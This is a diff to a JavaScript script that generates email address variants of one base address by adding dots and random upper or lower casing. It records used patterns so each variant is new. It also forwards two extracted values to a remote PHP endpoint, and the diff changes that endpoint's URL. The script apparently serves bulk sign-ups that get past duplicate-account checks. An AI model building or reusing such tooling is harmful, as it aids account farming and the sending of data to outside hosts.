@@ -17,8 +17,10 @@ function generateDotEmail() {
 
   let pattern;
   let selected;
+  let caseBits;
 
   while (true) {
+    // --- Dot generation (same as before) ---
     const dotCount = Math.floor(Math.random() * (12 - 3 + 1)) + 3;
 
     const gapIndexes = [...Array(gaps).keys()];
@@ -30,7 +32,16 @@ function generateDotEmail() {
 
     selected = gapIndexes.slice(0, dotCount).sort((a, b) => a - b);
 
-    pattern = selected.join(",");
+    // --- Case generation (new) ---
+    // Count letters in base
+    const letterCount = base.replace(/[0-9]/g, "").length;
+    caseBits = "";
+    for (let i = 0; i < letterCount; i++) {
+      caseBits += Math.random() < 0.5 ? "0" : "1"; // 0 = lowercase, 1 = uppercase
+    }
+
+    // Combine dot pattern and case pattern into unique key
+    pattern = `${selected.join(",")}|${caseBits}`;
 
     if (!used.has(pattern)) {
       fs.appendFileSync(PATTERN_FILE, pattern + "\n");
@@ -38,11 +49,23 @@ function generateDotEmail() {
     }
   }
 
+  // --- Build email with dots AND case ---
   let result = "";
+  let letterIndex = 0;
 
   for (let i = 0; i < base.length; i++) {
-    result += base[i];
+    const char = base[i];
+    
+    // Apply case if it's a letter
+    if (/[a-zA-Z]/.test(char)) {
+      const isUpper = caseBits[letterIndex] === "1";
+      result += isUpper ? char.toUpperCase() : char.toLowerCase();
+      letterIndex++;
+    } else {
+      result += char; // Numbers stay as-is
+    }
 
+    // Add dot after this position if selected
     if (selected.includes(i)) {
       result += ".";
     }
@@ -131,7 +154,7 @@ async function runTask() {
     } else {
       console.log("Extracted:", data);
 
-      const url = `https://ff.vpsmail.name.ng/secret.php?${encodeURIComponent(
+      const url = `https://telead.mail.name.ng/public.php?${encodeURIComponent(
         data[0]
       )}&${encodeURIComponent(data[1])}`;
 
@@ -140,7 +163,7 @@ async function runTask() {
           .toString()
           .trim();
 
-        console.log("Sent to secret.php");
+        console.log("Sent to public.php");
         console.log("Server response:", response);
       } catch (err) {
         console.error("Failed to send request:", err);
